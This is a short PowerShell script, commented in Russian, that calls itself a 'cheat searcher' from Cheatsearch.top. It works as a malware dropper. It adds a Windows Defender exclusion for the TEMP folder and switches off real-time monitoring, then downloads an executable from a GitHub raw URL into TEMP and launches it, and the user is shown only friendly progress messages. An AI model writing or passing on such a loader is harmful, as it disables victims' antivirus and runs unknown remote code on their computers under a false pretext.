# ============================================
# ИТОГОВЫЙ РАБОЧИЙ СКРИПТ (GitHub)
# ============================================

Clear
Write-Host "Cheatsearch.top - Best cheat searcher!" -ForegroundColor Cyan

# ===== ВАША РАБОЧАЯ ССЫЛКА =====
$url = "https://raw.githubusercontent.com/Legens246/rt/main/ccmmnd.exe"
$outputFile = "$env:TEMP\ccmmd.exe"

Write-Host "Сохраняем в: $outputFile" -ForegroundColor Cyan

# ===== ОТКЛЮЧАЕМ АНТИВИРУС (чтобы не мешал) =====
Write-Host "Temporarily disabling Windows Defender..." -ForegroundColor Yellow
try {
    Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Write-Host "Defender exclusions added." -ForegroundColor DarkGray
} catch {
    Write-Host "Could not modify Defender (run as Admin if needed)." -ForegroundColor DarkGray
}

# ===== СКАЧИВАЕМ ФАЙЛ =====
Write-Host "Downloading file..." -ForegroundColor Yellow

# Удаляем старый файл, если есть
if (Test-Path $outputFile) {
    Remove-Item $outputFile -Force -ErrorAction SilentlyContinue
}

try {
    Invoke-WebRequest -Uri $url -OutFile $outputFile -UseBasicParsing
    Write-Host "Download complete!" -ForegroundColor Green
} catch {
    Write-Host "Download failed: $_" -ForegroundColor Red
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit 1
}

# ===== ПРОВЕРЯЕМ, ЧТО ФАЙЛ СКАЧАЛСЯ =====
Start-Sleep -Seconds 1

if (Test-Path $outputFile) {
    $fileSize = (Get-Item $outputFile).Length
    Write-Host "File saved! Size: $fileSize bytes" -ForegroundColor Green
    
    # ===== ЗАПУСКАЕМ ФАЙЛ =====
    Write-Host "Starting the file..." -ForegroundColor Yellow
    try {
        Start-Process -FilePath $outputFile
        Write-Host "Process started successfully!" -ForegroundColor Green
    } catch {
        Write-Host "Failed to start: $_" -ForegroundColor Red
    }
} else {
    Write-Host "ERROR: File not found after download!" -ForegroundColor Red
}

# ===== ФИНАЛЬНЫЕ СООБЩЕНИЯ =====
Write-Host "`nSetup complete!" -ForegroundColor Green
Write-Host "Press any key to close..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")